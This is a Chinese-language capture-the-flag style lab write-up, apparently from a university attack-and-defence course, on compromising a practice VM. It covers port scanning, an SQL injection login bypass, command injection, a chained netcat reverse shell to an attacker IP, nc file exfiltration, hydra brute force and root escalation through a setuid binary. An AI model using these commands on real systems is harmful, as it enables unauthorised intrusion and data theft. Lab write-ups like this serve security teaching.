靶机三

发表于2025-10-21|更新于2025-10-22|NJUCS网络攻防实战
|总字数:1.3k|阅读时长:4分钟|浏览量:

这个是我之前参考的实验做法：

  1. 使用nmap进行搜索22和8080端口都是开放的
  2. 访问8080端口，使用burpsuite进行拦截，发现" or 1=1作为验证码进行破解，或者使用字典进行破解
  3. 发现存在指令的执行漏洞
  4. 靶机存在python环境，可以借助这个建立reverse shell
  5. 或者直接使用nc进行反弹shell的建立，使用nc的串连
    1. nc -nvlp 分别箭头3333和4444
    2. 在目标机上使用nc串联，hello | nc 192.168.50.8 3333 | /bin/bash | nc 192.168.50.8 4444

      把输入从3333端口处送入bash，然后bash的输出送入4444端口

    3. 建立了一个含两个窗口（一个输入，一个输出的反弹shell）
  6. 发现存在一个database.sql文件（sqlite数据库）
  7. 通过 nc -nvlp 5555 > db.sql来把靶机上的文件来下载文件（在靶机上运行 nc 192.168.50.8 5555< databse.sql）通过重定向实现下载
  8. 然后使用 使用sqllite来看文件的内容，发现了密码、邀请码(在数据库中. database .dump)，然后再cat /etc/passwd | grep bash 发现一些用户。
  9. 最后使用hydra来进行暴力破解，hydra。 先准备一个user.txt和pass.txt把密码和用户都准备好，运行 hydra -L user.txt -P pass.txt ssh://ip ,最后没有成功。
  10. 之前的靶机一和靶机二都是使用了内核提权（使用searchspolit找漏洞），第二个方法是寻找有suid的程序，当执行这个程序时，就拥有了程序所具有的权限。find / -type f -perm -u+s 2>/dev/null >/tmp/suid.txt （把错误都重定向到/dev/null下，把其他的内容都保存在文件中）最后想办法下载
  11. 发现只有一个.hme/scanner/cloudav_app这一个程序，whoami发现我是scanner，然后使用分析hone下面的源程序即可。

下面是我的具体实验记录：

先试用arp-scan获得主机ip为192.168.50.9，接着使用namp进行端口探测，尝试进入8080端口进行检查： ┌──(kali㉿kali)-[~] └─$ nmap -sV -p- 192.168.50.9 Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-21 08:59 EDT Nmap scan report for 192.168.50.9 Host is up (0.00055s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 8080/tcp open http Werkzeug httpd 0.14.1 (Python 2.7.17) MAC Address: 08:00:27:B6:52:04 (PCS Systemtechnik/Oracle VirtualBox virtual NIC) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 28.22 seconds ┌──(kali㉿kali)-[~] └─$ 发现开放的端口是8080和22端口，尝试查看8080端口的情况

发现是一个web服务，需要输入验证码才能进入，尝试使用burpsuite对请求进行狼藉，使用intruder模块进行SQL注入攻击： 从github上面复制了一些常见的sql injection的payload，然后开始渗透测试 发现其中Length有几个明显不同与其他的响应（Code：500），点击发现这些是成功实现注入的例子，这些例子都使用了"放在最前面，同时页面都显示出如下的错误： 显示了错误的语句，因此可以构造payload1"or 1=1--,成功进入。 猜测这里的文件都是靶机上的，用户输入一个文件名，然后进行病毒的探测，中间肯定需要用到执行命令，因此，尝试在文件名后面加上ls，看看是否有输出 发现的确有文件。

尝试利用这个漏洞进行建立reverse shell：

. nc -nvlp 分别箭头3333和4444 2. 在目标机上使用nc串联，hello | nc 192.168.50.8 3333 | /bin/bash | nc 192.168.50.8 4444 > 把输入从3333端口处送入bash，然后bash的输出送入4444端口 3. 建立了一个含两个窗口（一个输入，一个输出的反弹shell） 成功建立nc串联。

然后再靶机上发现有很多文件，因此，在靶机上启动HTTPserver： python -m SimpleHTTPServer 8000 成功把文件下载下来查看： 尝试分析这里的代码和项目结构，发现只有一个数据库的信息是有用的，但是在分析了数据库的内容之后，里面除了一些用户的名字和邀请码之外，没有什么有效信息，尝试使用暴力破解的方式，但是也没有成功。

回到根目录下继续寻找线索，发现有一个文件叫做update_cloudav.c 查看文件权限发现： 发现update_clouddav具有root的权限，并且是当前用户是可以执行的，尝试查看源文件，发现： 发现！这个文件接受了一个命令行作为参数，因此，只需要把编辑好的恶意代码写进去让其执行就可以以root身份执行恶意代码了！ 运行： ./update_cloudav "hello | nc 192.168.50.8 3334 | /bin/bash | nc 192.168.50.8 4445" 成功提权！活动root的shell。
